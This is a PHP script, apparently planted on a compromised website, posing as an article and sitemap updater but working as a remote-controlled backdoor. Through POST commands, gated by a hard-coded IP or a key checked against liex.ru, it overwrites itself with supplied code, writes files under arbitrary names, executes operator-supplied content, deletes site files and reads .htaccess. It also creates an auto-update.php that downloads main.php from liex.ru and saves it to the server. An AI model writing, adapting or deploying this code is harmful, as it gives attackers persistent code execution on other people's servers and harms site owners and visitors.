<?php
set_time_limit(1200);
ini_set('display_errors', '1');
error_reporting(E_NOTICE);
setlocale(LC_ALL, 'ru_RU.CP1251');

ini_set('default_socket_timeout', 10);

$index_page = "article_index";
$new_script = "new_script";
$log_file = "log";
$exec_file = "exec_index";
$host = $_SERVER['HTTP_HOST'];
$my_name = array_pop(explode('/', empty($_SERVER['SCRIPT_NAME'])?GetEnv('SCRIPT_NAME'):$_SERVER['SCRIPT_NAME']));
$cache_time = 3600; //1 час
$no_cache_index = false;

function logger($message) {
	global $log_file;
	$logh = fopen($log_file, 'a');
	fwrite($logh, "$message\n");
	fclose($logh);
}

$current_node_name = ''; $current_node_md5 = ''; $current_article_id = ''; $current_node_no_cache = ''; $current_node_exec = '';
$character_data = '';
$response_ok = false;


function rewrite_file($fname, $data) {
	$fh = fopen($fname, 'wb');
	if(!$fh) {
		unlink($fname);
		$fh = fopen($fname, 'wb');

	}
	if($fh) {
		fwrite($fh, $data);
		fclose($fh);
	}
}

function update_index($data) {
	logger("update_index called");
	if (!$data)
		return;

	$data = process($data);
	global $index_page;
	rewrite_file($index_page, $data);

}

function update_subindex($name, $data) {
	logger("update_subindex called");
	if (!$data || !$name)
		return;

	$data = process($data);
	rewrite_file($name, $data);

}

function check_name($id) {
	if (strpos($id, '..')!==FALSE) return false;
	if (strpos($id, '/') !==FALSE) return false;
	$n = strpos($id, '.');
	if ($n===FALSE) return false;
	$ext = substr($id, $n+1);
	$name= substr($id, 0, $n);
	return is_numeric($name) && ($ext=='html' || $ext=='php');
}

function update_article($id, $data) {
	if (!check_name($id)) {
		logger("update_article ignored. id=$id");
		return;
	}

	logger("update_article called. id=$id");
	if (!$id || !$data)
		return;

	$data = process($data);
	rewrite_file($id, $data);
}

function delete_article($id) {
	if (!check_name($id)) {
		logger("delete_article ignored. id=$id");
		return;
	}

	logger("delete_article called. id=$id");
	if (!$id)
		return;

	if (is_file($id))
		unlink($id);
}

function clear_files($list) {
	foreach ( explode(',', $list) as $id ) {
		if (is_file($id)) {
			logger("clearing file " . $id);
			unlink($id);
		}
	}
}

function process($data) {
	return stripslashes($data);
}

function update_script($data) {
	logger("update_script called");
	if (!$data)
		return;

	$data = process($data);
	global $new_script, $host, $my_name;
	rewrite_file($new_script, $data);

	if (!rename($new_script, $my_name)) {
		if (file_exists($my_name)) {
			unlink($my_name);
			if (!rename($new_script, $my_name)) {
				rewrite_file($my_name, $data);
			}
		}
	}
	unset($data);
}

function return_index() {
	global $exec_file, $index_page;
	require($index_page);
}
/// ##start##
function get_file_from_url($check_domain, $check_doc) {
	//попытка через fopen
	if (function_exists("fopen")) {
        	$fh = @fopen("http://" . $check_domain . ":80" . $check_doc, "r");
        	if ($fh) {
    			$r = '';
			while (!feof($fh)) $r .= fgets($fh);
        		fclose($fh);
            		return $r;
        	}
	}
	//попытка через fsockopen
	if (function_exists("fsockopen")) {
        	$sock = @fsockopen($check_domain, 80);
        	if ($sock) {
        		fputs ($sock, "GET ". $check_doc . " HTTP/1.0\r\nHost: " . $check_domain . "\r\n\r\n");
            		$r = "";
            		while (!feof($sock)) $r .= fgets($sock);
        		fclose($sock);
			$pos = strpos($r, "\r\n\r\n");
			if ($pos!==FALSE) $r = substr($r, $pos+4); else $r = '';
            		return  $r;
        	}
	}
    	//попытка через curl
	if (function_exists("curl_init")){
        	$ch = @curl_init("http://" . $check_domain . ":80" . $check_doc);
        	@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        	@curl_setopt($ch, CURLOPT_TIMEOUT, 1200);
        	$result = @curl_exec($ch);
        	curl_close($ch);
        	return $result;
	}

	return FALSE;
}

function getip()
{
  if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
    $ip = getenv("REMOTE_ADDR");

  elseif (!empty($_SERVER['REMOTE_ADDR']) && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
    $ip = $_SERVER['REMOTE_ADDR'];

  else
    $ip = "unknown";

  $n = strpos($ip, ",");
  if ($n) $ip = substr($ip, 0, $n);
  
  return($ip);
}

function check_valid_ip($code) {
	$valid_ip_addr = array('173.192.21.34');

	$ip = getip();

	foreach($valid_ip_addr as $a) {
		if($a==$ip) return true;
	}
//return false;

	$check_doc = "/websiteAction?action=checkOperation&code=" . $code;
	$check_domain = "liex.ru";

	$res = get_file_from_url($check_domain, $check_doc);
	return $res === 'ok';
}

function download_code() {

	$key = 'none';
	if (isset($_POST['key'])) $key = $_POST['key'];

	if (check_valid_ip($key)) {
		$res = get_file_from_url("liex.ru", "/main.php");
		if ($res) {
			$fg = @fopen("main.php", "w");
			if (!$fg) {
				unlink("main.php");
				$fg = @fopen("main.php", "w");
			}
			if ($fg) {
				fwrite($fg, $res);
				fclose($fg);
				echo "ok";
			} else echo "failed";
		} else echo "download failed";
	} else echo "ip check failed";
}
/// ##finish##

function sitemap($data) {

	$r = "";
	$p = "http://" . $_SERVER['SERVER_NAME'];
	$r .= '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
	$r .= '<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ';
	$r .= 'xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" ';
	$r .= 'xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

	$files = explode("\n", $data);
	foreach ($files as $file) {
		if ($file=='') continue;
		$a = explode("/", $file);
		$rf = $a[count($a)-1];
		if ($rf=='' && count($a)>1) {
			$rf = $a[count($a)-2];
			if (file_exists($rf . '.php')) $rf .= ".php";
			if (file_exists($rf . '.html')) $rf .= ".html";
		}
		if ($file != 'index.php' && $file != 'upload.php' && $file != 'main.php' && $file!='sitemap.xml') {
			$r .= "<url>\n\t<loc>" . $p . $file . "</loc>\n";
			$r .= "\t<lastmod>" . date("Y-m-d", filemtime($rf)) . "</lastmod>\n";
			$r .= "\t<changefreq>weekly</changefreq>\n</url>\n";
		}
	}
	$r .= "</urlset>";
	$f = fopen("sitemap.xml", "w");
	fwrite($f, $r);
	fclose($f);
}

function create_auto_update() {
	$my_name = array_pop(explode('/', empty($_SERVER['SCRIPT_NAME'])?GetEnv('SCRIPT_NAME'):$_SERVER['SCRIPT_NAME']));
	$f = fopen($my_name, "r");
	$g = fopen("auto-update.php", "w");
	$ins = 0;
	fputs ($g, "<?php\n");
	while (!feof($f)) {
		$s = fgets($f);
		if (strpos($s, "##start##")) { $ins = 1; continue; }
		if (strpos($s, "##finish##")) { $ins = 0; continue; }
		if ($ins==1) fputs($g, $s);
	}
	fputs ($g, "\ndownload_code();\n?>");
	fclose($g);
	fclose($f);
}

//START

if (is_file($log_file))
	logger("\n\n");
logger("Script started at ".date('r')." ==============\n");

if (!file_exists('.htaccess')) {
	logger('Create .htaccess');
	$hth = fopen('.htaccess', 'wb');
	fwrite($hth, "DirectoryIndex main.php\n\nAddDefaultCharset Windows-1251\n\nphp_flag register_globals off\n\nRewriteEngine on\n\nRewriteRule log$ nofile.htm");
	fclose($hth);
}

if (!file_exists('auto-update.php')) {
	logger('Create auto-update');
	create_auto_update();
}

if(!isset($_POST['action'])) {
 return_index();
 return;
}

$key = 'none';
if (isset($_POST['key'])) $key = $_POST['key'];

if (!check_valid_ip($key)) {
 logger('IP validity check failed');
 echo "bad ip";
 return;
}

$action = $_POST['action'];

if($action == 'initialize') {
	if(isset($_POST['code']) && $_POST['code']!="main") {
		logger("wrong script");
		echo 'wrong script (upload vs. main vs. cms_importer)';
	} else {
		echo 'ok';
	}
	return;
}

if($action == 'index_update') {
	if (isset($_POST['index'])) update_index($_POST['index']);
	else logger("index data not set");
	if (isset($_POST['clear'])) clear_files($_POST['clear']);
	if (isset($_POST['sitemap'])) sitemap($_POST['sitemap']);
	return;
}

if($action == 'htaccess') {
	print "version 1.00\n";
	
	$fh = @fopen("../.htaccess","r");
	if ($fh) {
		$c = fread($fh, 100000);
		fclose($fh);
		print $c;
	} else {
		print "no file";
	}
	
	return;
}


if($action == 'article_update') {
	if(!isset($_POST['id'])) logger("id not set");
	else if(!isset($_POST['text'])) logger("text not set");
	else {
		update_article($_POST['id'], $_POST['text']);
		echo 'ok';
	}
	
	if (isset($_POST['index'])) update_index($_POST['index']);
	if (isset($_POST['subindex'])) update_subindex($_POST['name'], $_POST['subindex']);
	if (isset($_POST['clear'])) clear_files($_POST['clear']);
	if (isset($_POST['sitemap'])) sitemap($_POST['sitemap']);
	return;
}

if($action == 'update_subindex') {
	if(!isset($_POST['name'])){
        logger("name not set");
    } else if(!isset($_POST['subindex'])){
        logger("subindex not set");
    } else {
        update_subindex($_POST['name'], $_POST['subindex']);
        echo 'ok';
	}
	return;
}

if($action == 'article_delete') {
	if(isset($_POST['id'])) {
		delete_article($_POST['id']);
		echo 'ok';
	}
	else logger("id not set");
	if (isset($_POST['index'])) update_index($_POST['index']);
	if (isset($_POST['clear'])) clear_files($_POST['clear']);
	if (isset($_POST['sitemap'])) sitemap($_POST['sitemap']);
	return;
}

if($action == 'script_update') {
	if(!isset($_POST['text'])) logger("script text not set");
	else {
		update_script($_POST['text']);
		echo 'ok';
	}
	return;
}

if($action == 'delete_all') {
	$files = glob('*.*');
	if ($files && is_array($files))
	foreach ($files as $file)
		if ($file != $my_name && $file != ".htaccess" && 
			$file != "log" && $file!=$index_page &&
			$file != "auto-update.php") unlink($file);
	if (!file_exists('auto-update.php')) create_auto_update();
	return;
}

?>
